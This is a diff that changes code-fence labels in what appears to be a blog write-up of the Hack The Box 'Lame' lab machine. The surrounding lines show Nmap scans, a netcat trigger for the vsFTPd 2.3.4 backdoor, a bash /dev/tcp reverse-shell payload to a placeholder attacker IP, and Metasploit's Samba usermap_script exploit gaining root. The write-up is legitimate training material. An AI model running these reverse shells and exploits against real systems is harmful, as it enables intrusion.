@@ -40,7 +40,7 @@ ports and services are open and running on a target machine or set of machines.
 Having aliased the IP of Lame to lame.htb using my `/etc/hosts` file, I pointed
 Nmap at the target machine:
 
-```shell
+```shell-session
 $ nmap -A -Pn lame.htb
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-16 18:03 GMT
 Stats: 0:00:55 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
@@ -126,7 +126,7 @@ whenever a user logs in with a colon in their username.
 I used [netcat](https://en.wikipedia.org/wiki/Netcat) to try and and open this
 backdoor on the target:
 
-```shell
+```shell-session
 $ nc lame.htb 21
 220 (vsFTPd 2.3.4)
 USER foo:)
@@ -141,7 +141,7 @@ PASS foo
 
 Then, in a second session, I reran Nmap to check for the backdoor on port 6200:
 
-```shell
+```shell-session
 $ nmap -Pn lame.htb
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-16 18:23 GMT
 Nmap scan report for lame.htb (10.129.31.208)
@@ -203,7 +203,7 @@ This essentially means that we make the target issue a network request _back_ to
 us in such a way that we get an interactive shell on the target. A typical
 payload to achieve this would look like
 
-```shell
+```shell-session
 bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1
 ```
 
@@ -216,7 +216,7 @@ to ensure that the terminal's standard input is also linked to this socket.
 As the attacker, we would then listen for this connection using netcat, for
 example:
 
-```shell
+```shell-session
 $ nc -nlvp <attacker_port>
 ```
 
@@ -226,7 +226,7 @@ interactive shell.
 At this point I confess I got a little lazy and just pulled out the
 `multi/samba/usermap_script` exploit module in Metasploit:
 
-```shell
+```shell-session
 $ msfconsole
 
 ... Metasploit spits out a load of ASCII art/version stuff here that I'll leave out ...
@@ -239,14 +239,14 @@ I found I had limited success with the default payload (a reverse shell spawned
 with netcat). Instead I loaded `cmd/unix/reverse`, which uses `telnet` to
 construct a _double_ reverse shell.
 
-```shell
+```shell-session
 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set PAYLOAD cmd/unix/reverse
 PAYLOAD => cmd/unix/reverse
 ```
 
 Metasploit lets us view the options for the loaded exploit:
 
-```shell
+```shell-session
 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> show options
 
 Module options (exploit/multi/samba/usermap_script):
@@ -286,7 +286,7 @@ the rest and change some of the defaults:
 * Finally, the value of `LPORT`, 4444, is not 1337 enough, so we'll need to
   change that...
 
-```shell
+```shell-session
 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOSTS lame.htb
 RHOSTS => lame.htb
 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST 10.10.14.78
@@ -297,7 +297,7 @@ LPORT => 1337
 
 The stage is set. Let's run it!
 
-```shell
+```shell-session
 [msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit
 
 [*] Started reverse TCP double handler on 10.10.14.78:1337 
@@ -324,7 +324,7 @@ escalate privileges. Now we just need to find the flags.
 
 Now we have root, obtaining the various flags is straightforward:
 
-```shell
+```shell-session
 $ cat /root/root.txt
 74626852c89d17e3d435b51c2390b333
 $ find /home
